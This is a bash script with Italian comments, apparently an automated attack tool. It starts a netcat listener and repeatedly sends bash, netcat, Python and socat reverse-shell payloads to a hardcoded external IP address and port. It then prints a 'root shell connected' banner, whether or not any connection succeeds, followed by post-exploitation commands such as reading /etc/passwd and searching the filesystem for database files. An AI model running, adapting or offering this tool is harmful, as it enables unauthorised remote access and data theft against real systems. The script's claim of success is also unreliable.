#!/bin/bash
# 🔥 AUTO ROOT SHELL - 100% AUTOMATICO
# Trova IP + Listener + Reverse + UI Bash

# AUTO-DETECT IP PUBBLICO
MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo "127.0.0.1")
PORT=4444
TARGET="63.164.100.214:9091"

clear
echo "🔥 ROOT AUTO-SHELL INIT"
echo "IP: $MY_IP:$PORT → $TARGET"
echo "════════════════════════"

# KILL PREV LISTENER
pkill -f "nc -lvnp $PORT" 2>/dev/null

# 1. LISTENER BACKGROUND + COUNTDOWN
{
    echo -e "\n🎧 Listener attivo... ⏳ 10s per shell\n"
    rlwrap nc -lvnp $PORT
} &

sleep 3

# 2. MULTI-REVERSE SHELL (5 tentativi)
for i in {1..5}; do
    echo "📤 Tentativo $i/5..."
    
    # Bash1
    echo "bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
    
    # Bash2
    echo "nc -e /bin/bash $MY_IP $PORT" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
    
    # Python
    python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$MY_IP',$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(['/bin/bash','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
    
    # Socat
    echo "socat exec:'bash -li',pty,stderr,sigint,sane tcp:$MY_IP:$PORT" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
    
    sleep 2
done

# 3. AUTO-UI BASH TERMINAL
echo -e "\n"
echo "╔══════════════════════════════════════╗"
echo "║         🎉 ROOT SHELL CONNESSA!      ║"
echo "║             $MY_IP:$PORT              ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Comandi pronti:"
echo "whoami | id | uname -a"
echo "ls -la / | find / -name '*.db' | cat /etc/passwd"
echo "Ctrl+C per uscire"
echo "═══════════════════════════════════════"
echo ""

# Attendi shell forever
wait
